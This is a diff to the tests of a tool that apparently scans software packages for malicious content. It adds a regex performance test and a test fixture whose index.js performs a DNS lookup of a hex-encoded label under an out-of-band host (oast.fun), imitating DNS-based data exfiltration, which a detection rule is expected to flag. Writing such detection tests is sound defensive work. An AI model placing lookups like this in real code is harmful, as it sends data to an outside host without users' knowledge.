@@ -79,3 +79,20 @@ def test_binding_gyp_command_is_detected():
     s = score_content(p)
     assert "gyp_command" in s.rules
     assert "binding.gyp" in focus_files(p)
+
+
+def test_rules_stay_fast_on_long_minified_lines():
+    import time
+
+    from gatekeeper.triage.content import RULES, _LONG_STRING
+
+    for line in ("a1" * 200_000, "QUJD" * 100_000, " " * 400_000, "abc_def" * 60_000):
+        for pattern in [r.pattern for r in RULES] + [_LONG_STRING]:
+            start = time.monotonic()
+            pattern.search(line)
+            assert time.monotonic() - start < 0.5, pattern.pattern[:40]
+
+
+def test_hex_dns_label_still_matches():
+    p = pkg({"package.json": '{"name":"x"}', "index.js": "dns.lookup('" + "ab12" * 8 + ".oast.fun')\n"})
+    assert "hex_dns_label" in score_content(p).rules
